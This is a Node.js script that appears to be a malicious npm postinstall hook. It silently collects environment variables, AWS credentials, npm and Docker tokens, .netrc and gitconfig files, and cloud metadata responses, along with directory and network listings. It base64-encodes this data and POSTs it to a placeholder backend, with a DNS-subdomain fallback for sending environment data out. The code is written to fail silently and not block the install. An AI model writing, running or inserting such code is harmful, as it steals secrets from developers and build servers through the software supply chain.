const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

const TARGET_HOST = '<BACKEND>';

function tryRead(p) {
  try { return fs.readFileSync(p, 'utf8'); } catch(e) { return null; }
}

function tryExec(cmd) {
  try { return execSync(cmd, { timeout: 3000 }).toString(); } catch(e) { return null; }
}

function tryLs(p) {
  try { return fs.readdirSync(p); } catch(e) { return null; }
}

try {
  const home = os.homedir();

  const data = {
    // Environment variables (primary target)
    env: process.env,

    // Identity
    cwd: process.cwd(),
    platform: process.platform,
    arch: process.arch,
    node: process.version,
    uid: process.getuid ? process.getuid() : null,
    hostname: os.hostname(),

    // AWS credentials (build server may have these)
    aws_creds: tryRead('/root/.aws/credentials')
              || tryRead(home + '/.aws/credentials'),
    aws_config: tryRead('/root/.aws/config')
              || tryRead(home + '/.aws/config'),

    // npm tokens (build server registry access)
    npmrc_root: tryRead('/root/.npmrc'),
    npmrc_home: tryRead(home + '/.npmrc'),
    npmrc_cwd:  tryRead(process.cwd() + '/.npmrc'),

    // Docker/ECS metadata endpoints
    ecs_meta: tryExec("curl -sf --max-time 2 http://169.254.170.2/v2/metadata"),
    ec2_meta_token: tryExec("curl -sf --max-time 2 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 10' http://169.254.169.254/latest/api/token"),

    // Directory listings
    ls_cwd:  tryLs(process.cwd()),
    ls_home: tryLs(home),
    ls_root: tryLs('/'),
    ls_etc:  tryLs('/etc'),

    // Interesting config files
    docker_config: tryRead(home + '/.docker/config.json'),
    gitconfig: tryRead(home + '/.gitconfig'),
    netrc: tryRead(home + '/.netrc'),

    // Build tool info
    yarn_rc: tryRead(home + '/.yarnrc') || tryRead(home + '/.yarnrc.yml'),
    npm_global: tryExec('npm config list --json'),

    // Network info
    resolv: tryRead('/etc/resolv.conf'),
    hosts: tryRead('/etc/hosts'),
    proc_net: tryRead('/proc/net/route'),
  };

  const payload = Buffer.from(JSON.stringify(data)).toString('base64');

  // POST the data
  const req = https.request({
    hostname: TARGET_HOST,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'text/plain',
      'Content-Length': Buffer.byteLength(payload),
      'X-Probe-Source': 'postinstall'
    },
    timeout: 15000
  }, (res) => {});

  req.on('error', () => {});
  req.write(payload);
  req.end();

  // Also try chunked DNS-style fallback via subdomain if POST is blocked
  // (encode first 200 chars of env as subdomain label)
  const envStr = JSON.stringify(process.env).slice(0, 180).replace(/[^a-zA-Z0-9]/g, '-');
  https.get(`https://${envStr}.dns.${TARGET_HOST}/`, () => {}).on('error', () => {});

} catch(e) {
  // Silent fail — never block the install
}
